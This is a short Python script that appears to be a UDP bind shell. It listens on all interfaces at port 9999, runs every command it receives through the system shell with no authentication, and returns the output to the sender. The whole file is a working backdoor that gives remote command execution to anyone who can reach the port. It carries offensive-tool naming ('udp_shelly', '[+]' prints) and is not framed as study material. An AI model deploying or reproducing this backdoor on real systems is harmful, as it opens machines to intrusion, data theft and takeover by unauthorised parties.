import socket
import subprocess

HOST = '0.0.0.0'     # Listen on all interfaces
PORT = 9999          # Port to listen on

class UdpSatellite:

    def udp_shelly(selfself):

        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.bind((HOST, PORT))
        print(f"[+] Satellite listening on UDP port {PORT}")

        while True:
            data, addr = sock.recvfrom(4096)
            command = data.decode().strip()
            print(f"[+] Received command from {addr}: {command}")

            if command.lower() in ['exit', 'quit']:
                print("[!] Shutting down on command.")
                break

            try:
                output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, timeout=10)
                response = output.decode()
            except subprocess.CalledProcessError as e:
                response = e.output.decode()
            except Exception as ex:
                response = f"Error: {str(ex)}"

            sock.sendto(response.encode(), addr)

        sock.close()

if __name__ == '__main__':
    a = UdpSatellite()
    a.udp_shelly()
